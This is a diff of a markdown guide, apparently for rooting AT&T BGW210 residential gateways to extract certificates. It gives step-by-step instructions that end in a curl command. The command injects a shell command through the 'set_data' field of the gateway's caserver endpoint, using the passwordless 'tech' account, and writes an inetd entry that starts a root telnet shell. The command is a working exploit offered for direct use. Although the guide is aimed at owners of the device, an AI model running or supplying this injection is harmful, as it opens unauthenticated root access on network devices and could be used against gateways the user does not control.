@@ -25,10 +25,15 @@ The certificates extracted from both NVG589 and NVG599 work.
 
 ### BGW210
 Once downgraded, go to http://192.168.1.254/cgi-bin/ipalloc.ha , type your device access code to login, and assign a static IP to your PC that you'll be executing the CURL commands from.
+
 I assigned my PC: 192.168.1.70 since that's what the RG's DHCP-Server had assigned it.
+
 Once you assign a static IP,  refresh your PC's local ip address. using ifconfig, or ipconfig if on windows (cmd prompt: ipconfig /release and then ipconfig /renew). You may ignore this step if you assigned the same IPv4 it received by the DHCP-Server.
+
 Once that's done, open http://192.168.1.254/cgi-bin/ipalloc.ha and authenticate again if it asks.
+
 Once you authenticate, run these CURL commands (remember to navigate to cURL, see my video for help.
+
 (tech has no password when prompted)
 
 curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh > /var/etc/inetd.d/telnet28|" -v --http1.1 https://192.168.1.254:49955/caserver
